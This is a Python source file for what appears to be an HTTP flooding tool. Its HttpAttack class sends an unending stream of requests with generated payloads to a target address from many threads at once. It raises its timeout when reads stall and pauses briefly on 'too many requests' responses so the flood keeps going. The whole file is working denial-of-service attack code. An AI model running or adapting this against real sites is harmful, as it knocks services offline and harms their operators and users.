import logging
from http import HTTPStatus
from threading import Thread
from time import sleep
from typing import Generator

import requests
from attacks.http.services import HttpService
from constants import CONNECTION_TIMEOUT, THREADS_AMOUNT
from shared.attacks import AttackRequest
from shared.errors import UserError


class HttpAttack:
    def __init__(self, attack_request: AttackRequest) -> None:
        self._service: HttpService = HttpService(attack_request)
        self._attack_request: AttackRequest = attack_request
        self._payload_size: int = self._attack_request.size.value
        self._payload_decrease_step: int = 10

        if self._attack_request.http_meta:
            self._http_meta = self._attack_request.http_meta
        else:
            raise UserError("HTTP attack metadata should be specified")

    def make_requests(self) -> Generator[requests.Response, None, None]:
        if self._attack_request.http_meta is None:
            raise UserError("HTTP attack metadata should be specified")

        http_method = self._http_meta.method.value.lower()
        connection_timeout = CONNECTION_TIMEOUT
        host = "://".join(
            (
                self._attack_request.http_meta.schema.value,
                self._attack_request.target.address,
            )
        )
        callback = getattr(requests, http_method)

        while True:
            payload = self._service.get_http_payload(self._attack_request.payload)
            try:
                yield callback(host, payload, headers=self._service.http_headers, timeout=connection_timeout)
            except requests.ReadTimeout:
                if connection_timeout > 8:
                    break
                connection_timeout += 2
                print(f"[+] Increasing connection timeout to {connection_timeout} seconds")
            except (requests.ConnectionError, requests.ConnectTimeout):
                raise UserError("Connection error")

    def send(self):
        requests_count = 0

        for response in self.make_requests():
            requests_count += 1

            if requests_count % 10 != 0:
                continue

            print("[+] Checking status codes")
            if 199 < response.status_code < HTTPStatus.NOT_FOUND:
                print("[+] Reach the destination")
            elif response.status_code == HTTPStatus.TOO_MANY_REQUESTS:
                print("[!] Too many requests. Sleeping for 2 seconds")
                sleep(2)
            elif response.status_code == HTTPStatus.NOT_FOUND:
                logging.error("Can not reach the destination")
                break

    def run(self) -> None:
        """Create and return packet to send"""
        threads = [Thread(target=self.send) for _ in range(THREADS_AMOUNT)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        if self._payload_size != self._attack_request.size.value:
            logging.warning(f"Payload size was decreased to {self._payload_size} bits")

    def run_debug(self) -> None:
        """Debug run"""
        self.send()

        if self._payload_size != self._attack_request.size.value:
            logging.warning(f"Payload size was decreased to {self._payload_size} bits")
